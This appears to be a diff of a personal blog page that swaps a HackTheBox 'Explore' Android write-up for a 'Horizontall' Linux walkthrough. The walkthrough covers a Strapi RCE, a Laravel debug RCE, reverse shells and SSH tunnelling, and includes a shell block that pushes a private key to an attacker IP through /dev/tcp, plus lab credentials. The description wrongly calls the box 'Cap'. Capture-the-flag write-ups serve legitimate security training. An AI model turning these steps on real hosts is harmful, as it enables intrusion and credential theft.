@@ -10,23 +10,23 @@
     <meta name="minute-prompt" content="minutes ago">
     <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
 <meta name="generator" content="Jekyll v4.2.1" />
-<meta property="og:title" content="Explore - HackTheBox" />
+<meta property="og:title" content="Horizontall - HackTheBox" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Explore is a box that’s first of it’s kind. It is (I think) the first android box ever released on Hack The Box. For foothold, you need to use an exploit for ES File Explorer to read arbitrary files on the device. This will lead you to an image file that contains a credential, which grants access to the box over SSH. Once in, there is an ADB service running locally on port 5555, which you can connect to using the ADB tool and elevate to root." />
-<meta property="og:description" content="Explore is a box that’s first of it’s kind. It is (I think) the first android box ever released on Hack The Box. For foothold, you need to use an exploit for ES File Explorer to read arbitrary files on the device. This will lead you to an image file that contains a credential, which grants access to the box over SSH. Once in, there is an ADB service running locally on port 5555, which you can connect to using the ADB tool and elevate to root." />
-<link rel="canonical" href="https://4g3nt47.github.io/posts/hackthebox/explore.html" />
-<meta property="og:url" content="https://4g3nt47.github.io/posts/hackthebox/explore.html" />
+<meta name="description" content="Cap is an easy linux box. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a Laravel instance running locally, which is also vulnerable to RCE, and will give you access to the box as root." />
+<meta property="og:description" content="Cap is an easy linux box. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a Laravel instance running locally, which is also vulnerable to RCE, and will give you access to the box as root." />
+<link rel="canonical" href="https://4g3nt47.github.io/posts/hackthebox/horizontall.html" />
+<meta property="og:url" content="https://4g3nt47.github.io/posts/hackthebox/horizontall.html" />
 <meta property="og:site_name" content="4g3nt47" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-10-30T00:00:00+01:00" />
+<meta property="article:published_time" content="2022-02-04T00:00:00+01:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Explore - HackTheBox" />
+<meta property="twitter:title" content="Horizontall - HackTheBox" />
 <meta name="twitter:site" content="@UmarAbdoul" />
 <meta name="google-site-verification" content="google_meta_tag_verification" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"Explore - HackTheBox","dateModified":"2021-10-30T00:00:00+01:00","datePublished":"2021-10-30T00:00:00+01:00","url":"https://4g3nt47.github.io/posts/hackthebox/explore.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/hackthebox/explore.html"},"description":"Explore is a box that’s first of it’s kind. It is (I think) the first android box ever released on Hack The Box. For foothold, you need to use an exploit for ES File Explorer to read arbitrary files on the device. This will lead you to an image file that contains a credential, which grants access to the box over SSH. Once in, there is an ADB service running locally on port 5555, which you can connect to using the ADB tool and elevate to root.","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"Horizontall - HackTheBox","dateModified":"2022-02-04T00:00:00+01:00","datePublished":"2022-02-04T00:00:00+01:00","url":"https://4g3nt47.github.io/posts/hackthebox/horizontall.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/hackthebox/horizontall.html"},"description":"Cap is an easy linux box. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a Laravel instance running locally, which is also vulnerable to RCE, and will give you access to the box as root.","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<title>Explore - HackTheBox | 4g3nt47
+<title>Horizontall - HackTheBox | 4g3nt47
   </title><!--
   The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
   Generated by: https://realfavicongenerator.net/
@@ -124,7 +124,7 @@
             <a href="/">
               Home
             </a>
-          </span><span>Explore - HackTheBox</span></span><!-- endof #breadcrumb -->
+          </span><span>Horizontall - HackTheBox</span></span><!-- endof #breadcrumb -->
 
     <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
 
@@ -159,7 +159,7 @@
   https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
 --><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->
 
-<h1 data-toc-skip>Explore - HackTheBox</h1>
+<h1 data-toc-skip>Horizontall - HackTheBox</h1>
 
 <div class="post-meta text-muted">
 
@@ -176,17 +176,17 @@
   Date format snippet
   See: ${JS_ROOT}/utils/timeago.js
 --><em class="timeago"
-    date="2021-10-30 00:00:00 +0100"data-toggle="tooltip"
+    date="2022-02-04 00:00:00 +0100"data-toggle="tooltip"
       data-placement="bottom"
-      title="Sat, Oct 30, 2021, 12:00 AM +0100">Oct 30, 2021</em>
+      title="Fri, Feb  4, 2022, 12:00 AM +0100">Feb  4</em>
 </span>
 
       <!-- lastmod date --><!-- read time --><!--
   Calculate the post's reading time, and display the word count in tooltip
  --><!-- words per minute  --><!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="753 words">
-  <em>4 min</em> read</span>
+  title="923 words">
+  <em>5 min</em> read</span>
 <!-- page views --></div>
 
   </div> <!-- .d-flex -->
@@ -194,141 +194,151 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <p><strong>Explore</strong> is a box that’s first of it’s kind. It is (I think) the first android box ever released on Hack The Box. For foothold, you need to use an exploit for <em>ES File Explorer</em> to read arbitrary files on the device. This will lead you to an image file that contains a credential, which grants access to the box over SSH. Once in, there is an ADB service running locally on port <strong>5555</strong>, which you can connect to using the ADB tool and elevate to root.</p>
+  <p><strong>Cap</strong> is an easy linux box. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a <em>Laravel</em> instance running locally, which is also vulnerable to <em>RCE</em>, and will give you access to the box as <code class="language-plaintext highlighter-rouge">root</code>.</p>
 
-<p><br /></p>
-
-<h3 id="info">Info<a href="#info" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
+<h3 id="about">About<a href="#about" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
 <p><br /></p>
 
 <ul>
-  <li><em>OS</em> - Android</li>
+  <li><em>OS</em> - Linux</li>
   <li><em>Difficulty</em> - Easy</li>
   <li><em>Points</em> - 20</li>
-  <li><em>Release</em> - 26/Jun/2021</li>
-  <li><em>IP</em> - 10.10.10.247</li>
+  <li><em>Release</em> - 28/Aug/2021</li>
+  <li><em>IP</em> - 10.10.11.105
+<br /></li>
 </ul>
-
-<p><br /></p>
 
 <hr />
 <h3 id="recon">Recon<a href="#recon" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
 <p><br /></p>
 
-<pre><code class="language-raw">Nmap scan report for 10.10.10.247
-Host is up (0.25s latency).
+<h4 id="nmap">Nmap<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
 
-PORT      STATE    SERVICE VERSION
-2222/tcp  open     ssh     (protocol 2.0)
-| fingerprint-strings: 
-|   NULL: 
-|_    SSH-2.0-SSH Server - Banana Studio
-| ssh-hostkey: 
-|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
-5555/tcp  filtered freeciv
-59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
-|_http-title: Site doesn't have a title (text/plain).
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port2222-TCP:V=7.70%I=7%D=10/29%Time=617C5151%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
+<pre><code class="language-raw">Nmap scan report for 10.10.11.105
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds
 </code></pre>
 
-<h4 id="services">Services<a href="#services" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
+<p>Homepage of the web service;</p>
 
-<ul>
-  <li>SSH server on port <strong>2222</strong></li>
-  <li>HTTP server on port 59777
-<img data-src="/assets/img/20210924184841.png" alt="" data-proofer-ignore></li>
-  <li>Port 5555 - non-responsive.</li>
-</ul>
+<p><img data-src="/assets/img/20210928115638.png" alt="" data-proofer-ignore></p>
 
-<h4 id="web-server">Web Server<a href="#web-server" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
+<p>Technologies detected by <em>Wappalyzer</em>;</p>
 
-<p>Blank web page with no directory listing.</p>
+<p><img data-src="/assets/img/20210928115701.png" alt="" data-proofer-ignore></p>
 
-<p><img data-src="/assets/img/20210924185727.png" alt="" data-proofer-ignore></p>
+<p>The web page contains a few buttons/links, including a contact-us form, none of which do anything.</p>
 
-<p>Discovered folder <code class="language-plaintext highlighter-rouge">init/</code> showing some error:</p>
+<p>Viewing the source code of the file indicate it’s being dynamically generated using JavaScript, with 2 JavaScript files being imported;</p>
 
-<p><img data-src="/assets/img/20210924185802.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928212140.png" alt="" data-proofer-ignore></p>
 
-<p>Fuzzing the <code class="language-plaintext highlighter-rouge">init/</code> folder didn’t reveal anything of importance. However, continuous fuzzing of the root directory with <strong>ffuf</strong> found some folders;</p>
+<p>The first JS file is pretty large at about 1.2 MB in size. The second one is only 20 KB in size. The JS codes have a mangled syntax, and had to be formatted using <code class="language-plaintext highlighter-rouge">js-beautify</code> for easier analysis. About 2 minutes into skimming through the code, I discovered a subdomain on the site;</p>
 
-<p><img data-src="/assets/img/20210924191505.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928212747.png" alt="" data-proofer-ignore></p>
 
-<p>The above marked folders are commonly found in the root of android devices. This was confirmed by making a request to a special folder found in the internal storage of all android devices;</p>
+<p>I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with the new host, and was able to connect;</p>
 
-<p><img data-src="/assets/img/20210924191734.png" alt="" data-proofer-ignore></p>
-
-<p>Since internal storage is the home of an android user, request to <code class="language-plaintext highlighter-rouge">user.txt</code> inside the <code class="language-plaintext highlighter-rouge">/sdcard</code> revealed the user flag;</p>
-
-<p><img data-src="/assets/img/20210926165521.png" alt="" data-proofer-ignore></p>
-
-<p><br /></p>
+<p><img data-src="/assets/img/20210928213116.png" alt="" data-proofer-ignore>
+<br /></p>
 
 <hr />
 <h3 id="foothold">Foothold<a href="#foothold" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
 <p><br /></p>
 
-<p>My initial target of choice for foothold is the SSH server running on port 2222. It has been identified as <strong>SSH Server Banana Studio</strong> (<strong>net.xnano.android.sshserver</strong>) in it’s service banner, and provides a username and password login. Google searches lead me to this app;</p>
+<p>Searching for one of the web technologies identified by <em>Wappalyzer</em> on the host <strong>api-prod.horizontall.htb</strong> using <code class="language-plaintext highlighter-rouge">searchsploit</code> revealed some interesting flaws;</p>
 
-<p><img data-src="/assets/img/20210926170442.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928213504.png" alt="" data-proofer-ignore></p>
 
-<p>In the descriptions, it says anonymous login with username <strong>ssh</strong> and blank password is allowed, but that didn’t work on the target;</p>
+<p><img data-src="/assets/img/20210928213438.png" alt="" data-proofer-ignore></p>
 
-<p><img data-src="/assets/img/20210926170612.png" alt="" data-proofer-ignore></p>
+<p>Using the last exploit shown above, I was able achieve blind command-injection on the host;</p>
 
-<p>Installing the SSH server on an android device showed that the <strong>ssh</strong> user need to be enabled, after which I was able to login (to the test android device) with no password;</p>
+<p><img data-src="/assets/img/20210928214332.png" alt="" data-proofer-ignore></p>
 
-<p><img data-src="/assets/img/20210926171152.png" alt="" data-proofer-ignore></p>
+<p>I then used it to spawn a bash reverse shell;</p>
 
-<p>At this point, I went back to recon, and found that the service on port <strong>59777</strong> may actually be an <strong>ES File Explorer</strong> service after a search on <code class="language-plaintext highlighter-rouge">exploitdb</code> showed an exploit that targets port <strong>59777</strong> on android. <code class="language-plaintext highlighter-rouge">searchsploit</code> doesn’t have any option to search exploit contents, atleast none that I know of, so I had to use <code class="language-plaintext highlighter-rouge">grep</code> on the path where <code class="language-plaintext highlighter-rouge">exploitdb</code> store it’s exploits;</p>
+<p><img data-src="/assets/img/20210928214641.png" alt="" data-proofer-ignore></p>
 
-<p><img data-src="/assets/img/20211029102150.png" alt="" data-proofer-ignore></p>
+<p>A user named <code class="language-plaintext highlighter-rouge">developer</code> exists, and I was able to obtain the user flag using the <em>strapi</em> account;</p>
 
-<p><img data-src="/assets/img/20211029100850.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928214945.png" alt="" data-proofer-ignore></p>
 
-<p>Using the <code class="language-plaintext highlighter-rouge">listFiles</code> command, I was able to list files on the server, but I am not sure the exploit can be used to list a specific directory;</p>
+<p>The user flag file is the only thing readable to the <em>strapi</em> account inside <strong>developer</strong>’s home directory, so I continue to explore the system to find something of use. Inside the <em>strapi</em> installation folder in <code class="language-plaintext highlighter-rouge">/opt/strapi</code>, I found a JSON file with credentials for the <code class="language-plaintext highlighter-rouge">developer</code> user <code class="language-plaintext highlighter-rouge">developer:#J!:F9Zt2u</code>;</p>
 
-<p><img data-src="/assets/img/20211029101012.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928215956.png" alt="" data-proofer-ignore></p>
 
-<p>Testing the other commands implemented in the exploit, the <code class="language-plaintext highlighter-rouge">listPics</code> command showed an interesting file;</p>
+<p>The config seems to be for MySQL server, and <code class="language-plaintext highlighter-rouge">netstat</code> showed a MySQL server is running locally, along with some strange service on port <strong>1337</strong>;</p>
 
-<p><img data-src="/assets/img/20211029101146.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928220206.png" alt="" data-proofer-ignore></p>
 
-<p>Requesting the file in a browser, I got the credential <code class="language-plaintext highlighter-rouge">kristi:Kr1sT!5h@Rp3xPl0r3!</code>;</p>
+<p>Attempt to login to the developer account via SSH using the credential found failed. I was able to access the backend MySQL server using the above credential, but found nothing of interest.</p>
 
-<p><img data-src="/assets/img/20210926173830.png" alt="" data-proofer-ignore></p>
+<p>Using <code class="language-plaintext highlighter-rouge">curl</code>, the service on port <strong>1337</strong> was identified to be the web app discovered on <strong>http://api-prod.horizontall.htb/</strong>, while the service on port <strong>8000</strong> was identified as a <em>Laravel</em> installation by downloading the home page using <code class="language-plaintext highlighter-rouge">curl</code> on the target host and shipping it to my attack host using <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
 
-<p>Using the credential, I was able to get an SSH access on the device;</p>
+<p><img data-src="/assets/img/20210928222028.png" alt="" data-proofer-ignore></p>
 
-<p><img data-src="/assets/img/20210926174148.png" alt="" data-proofer-ignore></p>
+<p>I then created an SSH key file for the <em>strapi</em> user manually because the bash session through <code class="language-plaintext highlighter-rouge">netcat</code> is unstable, and shipped the private key to my attack box using the commands;</p>
+<div class="language-bash highlighter-rouge"><div class="code-header"><span label-text="Shell"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="c"># On attacking machine (a netcat listener to save the file)</span>
+<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvp</span> 443 <span class="o">&gt;</span> id_rsa
 
-<p><br /></p>
+<span class="c"># On target machine in the home of strapi</span>
+<span class="nv">$ </span>ssh-keygen <span class="c"># Create the keys</span>
+<span class="nv">$ </span><span class="nb">cd</span> .ssh/
+<span class="nv">$ </span><span class="nb">cp </span>id_rsa.pub authorized_keys <span class="c"># Enable the key.</span>
+<span class="nv">$ </span><span class="nb">cat </span>id_rsa /dev/tcp/10.10.14.31/443 <span class="c"># Push it to my box</span>
+
+<span class="c"># On attacking machine</span>
+<span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa <span class="c"># Required by the ssh client</span>
+<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa strapi@horizontall.htb <span class="c"># Connect using the key</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>It worked and I gained SSH access to the box as <em>strapi</em>. Using the SSH access, I set up local port-forwarding from my host on port <strong>8000</strong> to the <em>Laravel</em> service on port <strong>8000</strong> on the target host;</p>
+
+<p><img data-src="/assets/img/20210928225632.png" alt="" data-proofer-ignore>
+<br /></p>
 
 <hr />
 <h3 id="privesc">PrivEsc<a href="#privesc" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
 <p><br /></p>
 
-<p>Querying for listening services showed that port <strong>5555</strong>, which NMAP reported earlier as filtered, is running;</p>
+<p>A quick search found a promising RCE exploit for the version of <em>Laravel</em> running (version 8), but couldn’t use it as it required absolute path of <em>Laravel</em> running on the host, which I didn’t know;</p>
 
-<p><img data-src="/assets/img/20210926174558.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210928231740.png" alt="" data-proofer-ignore></p>
 
-<p>I then setup an SSH tunnel between my attack host and the target to allow access to the service;</p>
+<p>I was able to obtain the web root by querying <code class="language-plaintext highlighter-rouge">/profiles</code>, a file I read about while reading a post on <em><a href="https://book.hacktricks.xyz">hacktricks</a></em> on <em>Laravel</em> debug mode exploitation, on the web app;</p>
 
-<p><img data-src="/assets/img/20210926212426.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210929075303.png" alt="" data-proofer-ignore></p>
 
-<p>Port <strong>5555</strong> is the default port used when connecting an android device to an ADB daemon over TCP. Using the <em>ADB</em> client installed on my host, I was able to connect to the service over TCP;</p>
+<p>I was able to get the exploit working on first try using the discovered web root for <em>Laravel</em>;</p>
 
-<p><img data-src="/assets/img/20210926212608.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210929080219.png" alt="" data-proofer-ignore></p>
 
-<p>Using the <code class="language-plaintext highlighter-rouge">su</code> command, root privileges were obtained, and the root flag was found in the <code class="language-plaintext highlighter-rouge">/data</code> directory;</p>
+<p>Using my SSH access to <em>strapi</em> user, I downloaded a bash reverse shell from a web service running on my attack host, saved it as <code class="language-plaintext highlighter-rouge">/dev/shm/bash_rev.sh</code>, made it executable, and execute it using the <em>Laravel</em> exploit. I took this approach because directly executing the bash reverse shell code using the <em>Laravel</em> exploit kept failing. This gave me root access to the box;</p>
 
-<p><img data-src="/assets/img/20210926212507.png" alt="" data-proofer-ignore></p>
+<p><img data-src="/assets/img/20210929082849.png" alt="" data-proofer-ignore></p>
 
-<p><br /></p>
+<p><img data-src="/assets/img/20210929082140.png" alt="" data-proofer-ignore>
+<br /></p>
 
 <hr />
 <h3 id="summary">Summary<a href="#summary" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
@@ -336,19 +346,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <ul>
   <li>Identified running services using NMAP.</li>
-  <li>Found a web server on port <strong>59777</strong>;
+  <li>Found a web app that relies heavily on JavaScript to dynamically generate contents, all of which are imported from .js files.</li>
+  <li>Downloaded the .js files for code analysis, which revealed a hidden virtual host running a web service at <strong>api-prod.horizontall.htb</strong>
     <ul>
-      <li>Bruteforcing with <code class="language-plaintext highlighter-rouge">gobuster</code> reveals a file structure similar to that of android devices.</li>
-      <li>Obtained user flag at <code class="language-plaintext highlighter-rouge">/sdcard/user.txt</code> since <code class="language-plaintext highlighter-rouge">/sdcard</code> is the home directory of android users.</li>
+      <li><em>Wappalyzer</em> identified a CMS named <strong>strapi</strong>, and a search using <code class="language-plaintext highlighter-rouge">searchploit</code> revealed an RCE flaw, using which a remote shell was obtained on the host as the user <code class="language-plaintext highlighter-rouge">strapi</code>.</li>
     </ul>
   </li>
-  <li>Tracked down the application that provide the SSH service running on the host on port <strong>2222</strong>, and installed it on an android device for testing.</li>
-  <li>Found an exploit targetting port <strong>59777</strong> on android devices in <code class="language-plaintext highlighter-rouge">exploitdb</code></li>
-  <li>Obtained SSH access on the box using the credentials of <code class="language-plaintext highlighter-rouge">kristi</code>.</li>
-  <li>Inside the box as <code class="language-plaintext highlighter-rouge">kristi</code>;
+  <li>Inside the box as the user <code class="language-plaintext highlighter-rouge">strapi</code>;
     <ul>
-      <li>Setup an SSH tunnel from my attack host to the target on port <strong>5555</strong>, which is the port used by ADB.</li>
-      <li>Connect to the ADB service using <code class="language-plaintext highlighter-rouge">adb</code> installed on my host, and obtained root access using the <code class="language-plaintext highlighter-rouge">su</code> command.</li>
+      <li>User account with the name <code class="language-plaintext highlighter-rouge">developer</code> was identified, and the user flag was obtained from his/her root directory.</li>
+      <li>Identified a service running locally on port <strong>8000</strong> as <strong>Laravel</strong> version 8, which is vulnerable to <em>RCE</em>.</li>
+      <li>Setup a tunnel with SSH, which allowed me to exploit the <em>RCE</em> flaw.</li>
     </ul>
   </li>
 </ul>
@@ -359,11 +367,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 
   <!-- categories --><div class="post-meta mb-3">
     <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/hackthebox/'>hackthebox</a></div><!-- tags --><div class="post-tags">
-    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/android/"
-          class="post-tag no-text-decoration" >android</a><a href="/tags/web/"
-          class="post-tag no-text-decoration" >web</a><a href="/tags/es-file-explorer/"
-          class="post-tag no-text-decoration" >es file explorer</a><a href="/tags/adb/"
-          class="post-tag no-text-decoration" >adb</a><a href="/tags/tunneling/"
+    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/linux/"
+          class="post-tag no-text-decoration" >linux</a><a href="/tags/web/"
+          class="post-tag no-text-decoration" >web</a><a href="/tags/static-analysis/"
+          class="post-tag no-text-decoration" >static analysis</a><a href="/tags/cve/"
+          class="post-tag no-text-decoration" >cve</a><a href="/tags/rce/"
+          class="post-tag no-text-decoration" >rce</a><a href="/tags/tunneling/"
           class="post-tag no-text-decoration" >tunneling</a></div><div class="post-tail-bottom
     d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
     <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
@@ -374,13 +383,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <div class="share-wrapper">
   <span class="share-label text-muted mr-1">Share</span>
-  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Explore - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/explore.html" data-toggle="tooltip" data-placement="top"
+  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Horizontall - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/horizontall.html" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
-        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Explore - HackTheBox - 4g3nt47&u=https://4g3nt47.github.io/posts/hackthebox/explore.html" data-toggle="tooltip" data-placement="top"
+        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Horizontall - HackTheBox - 4g3nt47&u=https://4g3nt47.github.io/posts/hackthebox/horizontall.html" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
-        </a><a href="https://telegram.me/share?text=Explore - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/explore.html" data-toggle="tooltip" data-placement="top"
+        </a><a href="https://telegram.me/share?text=Horizontall - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/horizontall.html" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a><i id="copy-link" class="fa-fw fas fa-link small"
@@ -426,43 +435,43 @@ Service detection performed. Please report any incorrect results at https://nmap
     <h3 class="pt-2 mt-1 mb-4 ml-1"
       data-toc-skip>Further Reading</h3>
     <div class="card-deck mb-4"><div class="card">
-        <a href="/posts/hackthebox/horizontall.html">
+        <a href="/posts/hackthebox/bountyhunter.html">
           <div class="card-body"><!--
   Date format snippet
   See: ${JS_ROOT}/utils/timeago.js
 --><em class="timeagosmall"
-    date="2022-02-04 00:00:00 +0100">Feb  4</em>
-<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Horizontall - HackTheBox</h3>
+    date="2021-11-18 00:00:00 +0100">Nov 18, 2021</em>
+<h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter - HackTheBox</h3>
             <div class="text-muted small">
-              <p>Cap is an easy linux box. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web appli...
+              <p>Another interesting easy linux box, Bounty Hunter is a box that features a web application that is vulnerable to XML External Entitiy injection. This flaw allows an attacker to read local files on ...
               </p>
             </div>
           </div>
         </a>
       </div><div class="card">
-        <a href="/posts/tutorial/mitmproxy.html">
+        <a href="/posts/hackthebox/writer.html">
           <div class="card-body"><!--
   Date format snippet
   See: ${JS_ROOT}/utils/timeago.js
 --><em class="timeagosmall"
-    date="2022-01-25 00:00:00 +0100">Jan 25</em>
-<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Exploiting Web Applications with MITM Proxy and Elinks</h3>
+    date="2021-12-11 00:00:00 +0100">Dec 11, 2021</em>
